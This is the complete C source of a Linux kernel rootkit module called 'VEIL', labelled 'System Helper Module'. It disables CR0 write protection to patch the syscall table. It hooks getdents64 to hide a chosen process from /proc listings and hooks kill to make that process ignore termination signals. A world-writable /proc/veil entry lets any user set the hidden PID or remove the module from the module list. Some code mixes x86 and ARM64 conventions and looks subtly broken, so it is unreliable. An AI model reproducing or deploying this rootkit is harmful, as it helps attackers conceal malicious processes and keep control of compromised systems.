#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/spinlock.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("VEIL");
MODULE_DESCRIPTION("System Helper Module");

#define PROC_ENTRY "veil"
static unsigned long *sys_call_table_ptr = NULL;
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static DEFINE_SPINLOCK(veil_table_lock);
static int veil_pid = 0;
static int veil_installed = 0;

static inline void write_cr0_forced(unsigned long val) {
    unsigned long __force_order;
    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->regs[1];
    int ret = orig_getdents64(regs);
    if (ret <= 0) return ret;
    unsigned long flags; int target_pid;
    spin_lock_irqsave(&veil_table_lock, flags); target_pid = veil_pid;
    spin_unlock_irqrestore(&veil_table_lock, flags);
    if (target_pid <= 0) return ret;
    struct linux_dirent64 *cur, *prev = NULL;
    unsigned long off = 0;
    struct linux_dirent64 *kdir = kzalloc(ret, GFP_KERNEL);
    if (!kdir) return ret;
    copy_from_user(kdir, dirent, ret);
    while (off < ret) {
        cur = (struct linux_dirent64 *)((char *)kdir + off);
        char pid_str[16]; snprintf(pid_str, sizeof(pid_str), "%d", target_pid);
        if (strcmp(cur->d_name, pid_str) == 0) {
            if (cur == kdir) { unsigned long next = cur->d_reclen; memmove(cur, (char *)cur + next, ret - off - next); ret -= next; continue; }
            else { prev->d_reclen += cur->d_reclen; }
        }
        prev = cur; off += cur->d_reclen;
    }
    copy_to_user(dirent, kdir, ret); kfree(kdir);
    return ret;
}

static asmlinkage long hook_kill(const struct pt_regs *regs) {
    pid_t pid = (pid_t)regs->regs[0]; int sig = (int)regs->regs[1];
    unsigned long flags; int target_pid;
    spin_lock_irqsave(&veil_table_lock, flags); target_pid = veil_pid;
    spin_unlock_irqrestore(&veil_table_lock, flags);
    if (target_pid > 0 && pid == target_pid && (sig == SIGKILL || sig == SIGTERM || sig == SIGSTOP)) return 0;
    return orig_kill(regs);
}

static ssize_t veil_proc_write(struct file *file, const char __user *buf, size_t count, loff_t *ppos) {
    char kbuf[64] = {0}; unsigned long flags;
    if (count > 63) count = 63;
    if (copy_from_user(kbuf, buf, count)) return -EFAULT;
    if (strncmp(kbuf, "pid ", 4) == 0) { int new_pid; kstrtoint(kbuf + 4, 10, &new_pid); spin_lock_irqsave(&veil_table_lock, flags); veil_pid = new_pid; spin_unlock_irqrestore(&veil_table_lock, flags); }
    else if (strncmp(kbuf, "hide", 4) == 0) list_del_init(&THIS_MODULE->list);
    return count;
}

static const struct proc_ops veil_proc_ops = { .proc_write = veil_proc_write };

static int __init veil_init(void) {
    sys_call_table_ptr = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!sys_call_table_ptr) return -ENODEV;
    spin_lock(&veil_table_lock);
    orig_getdents64 = (void *)sys_call_table_ptr[__NR_getdents64];
    orig_kill = (void *)sys_call_table_ptr[__NR_kill];
    write_cr0_forced(read_cr0() & ~0x00010000);
    sys_call_table_ptr[__NR_getdents64] = (unsigned long)hook_getdents64;
    sys_call_table_ptr[__NR_kill] = (unsigned long)hook_kill;
    write_cr0_forced(read_cr0() | 0x00010000);
    veil_installed = 1;
    spin_unlock(&veil_table_lock);
    proc_create(PROC_ENTRY, 0666, NULL, &veil_proc_ops);
    return 0;
}

static void __exit veil_exit(void) {
    spin_lock(&veil_table_lock);
    if (veil_installed) {
        write_cr0_forced(read_cr0() & ~0x00010000);
        sys_call_table_ptr[__NR_getdents64] = (unsigned long)orig_getdents64;
        sys_call_table_ptr[__NR_kill] = (unsigned long)orig_kill;
        write_cr0_forced(read_cr0() | 0x00010000);
        veil_installed = 0;
    }
    spin_unlock(&veil_table_lock);
    remove_proc_entry(PROC_ENTRY, NULL);
}

module_init(veil_init);
module_exit(veil_exit);
